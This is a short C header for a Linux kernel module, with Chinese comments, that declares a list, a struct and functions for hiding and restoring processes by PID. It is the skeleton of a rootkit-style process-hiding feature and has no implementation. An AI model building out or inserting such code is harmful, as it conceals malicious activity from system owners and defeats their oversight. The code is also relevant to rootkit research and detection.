#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/init_task.h>
#include <linux/fs.h>
#include <linux/types.h>

//进程隐藏的存储链表
static struct list_head hide_list_header=LIST_HEAD_INIT(hide_list_header);
//进程隐藏的存储结点
struct hide_node{
	pid_t pid_victim_t;
	struct task_struct* task_use_t;
	struct list_head hide_list_header_t;
};
int hide_pid_fn(pid_t pid_victim);//隐藏进程
int recover_pid_fn(pid_t pid_victim);//恢复隐藏的进程
int recover_pid_all(void);//恢复所有进程